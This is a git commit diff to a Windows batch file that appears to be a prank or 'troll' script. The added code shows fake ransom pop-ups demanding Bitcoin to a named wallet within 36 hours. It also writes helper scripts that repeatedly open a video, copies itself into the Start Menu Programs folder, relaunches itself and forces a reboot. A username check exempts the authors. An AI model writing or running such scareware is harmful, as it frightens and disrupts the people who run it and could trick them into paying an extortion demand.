5a1de5edaba4e1306472696b7cfb84d1e3eebae7
Ficolats <94857669+guush07@users.noreply.github.com>
2022-03-25 16:38:54 +0100

    Add files via upload

--- full.bat
+++ full.bat
@@ -2,10 +2,13 @@
 echo _______________________________________
 echo Oh no you ate too much and died
 echo _______________________________________
+timeout 2
 echo you fool
 echo _______________________________________
+timeout 2
 echo I warned you
 echo _______________________________________
+timeout 2
 
 
 
@@ -43,7 +46,7 @@ echo _______________________________________
 
 
 ::failsave
-move 
+set /a loops=0
 if %username%==Guus0 GOTO :end
 if %username%==joopc GOTO :end
 :: ok so if you are reading this it is because we want to test it without the troll afterwards xD ::
@@ -57,8 +60,26 @@ echo c=msgbox("To wallet 3EC6xfP7fnrz8er5WBtp1q6Q7Rw3krNhZ6" ,0, "BTC FOR ME")>>
 echo d=msgbox("When done, your pc will be saved" ,0, "YOU HAVE LOST!")>>"C:\mini\msg.vbs"
 echo e=msgbox("You have 36 hours starting NOW" ,0, "POWER IS MINE!!!!")>>"C:\mini\msg.vbs"
 start cscript "C:\mini\msg.vbs"
-set url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-start chrome.exe %url%
-move "%~f0" "C:\Users\Guus0\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"
 
+echo :loop>"C:\mini\meme.bat
+echo set /a loops=0>>"C:\mini\meme.bat"
+echo set url="https://www.youtube.com/watch?v=dQw4w9WgXcQ">>"C:\mini\meme.bat"
+echo start chrome.exe %url%>>"C:\mini\meme.bat"
+echo set /a loops=%loops%+1>>"C:\mini\meme.bat"
+echo if %loops%=10 GOTO :stop>>"C:\mini\meme.bat"
+echo GOTO :loop>>"C:\mini\meme.bat"
+echo :stop>>"C:\mini\meme.bat"
+echo exit>>"C:\mini\meme.bat"
+
+echo CreateObject("WScript.Shell").Run("C:\\mini\\meme.bat")>"C:\mini\lol.vbs
+
+echo @echo off>"C:\mini\lol.bat
+echo start cscript "C:\mini\lol.vbs">"C:\mini\lol.bat"
+echo start cmd.exe "C:\mini\lol.bat">"C:\mini\lol.bat"
+echo timeout 5>"C:\mini\lol.bat"
+
+
+move "%~f0" "C:\Users\Guus0\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"
+start cmd.exe /k "%~f0"
+shutdown -r -t 100
 :end
